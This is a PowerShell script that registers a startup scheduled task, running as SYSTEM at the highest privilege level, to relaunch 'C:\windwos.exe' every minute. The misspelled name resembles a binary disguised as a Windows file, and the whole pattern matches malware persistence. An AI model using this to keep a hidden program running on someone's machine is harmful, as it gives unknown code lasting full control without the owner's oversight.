# Define the PowerShell script content
$scriptContent = @'
while ($true) {
    Start-Process "C:\windwos.exe"
    Start-Sleep -Seconds 60
}
'@

# Define the path for the PowerShell script file
$scriptPath = "C:\run_every_minute.ps1"

# Create and save the PowerShell script file
New-Item -Path $scriptPath -ItemType File -Force
Set-Content -Path $scriptPath -Value $scriptContent

# Define the task name
$taskName = "Run_EXE_Every_Minute"

# Define the action to run the PowerShell script
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-File $scriptPath"

# Define the trigger to start the task at system startup
$trigger = New-ScheduledTaskTrigger -AtStartup

# Register the scheduled task to run at startup with highest privileges
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Run EXE file every minute using PowerShell script" -User "SYSTEM" -RunLevel Highest

# Verify the task creation
Get-ScheduledTask -TaskName $taskName
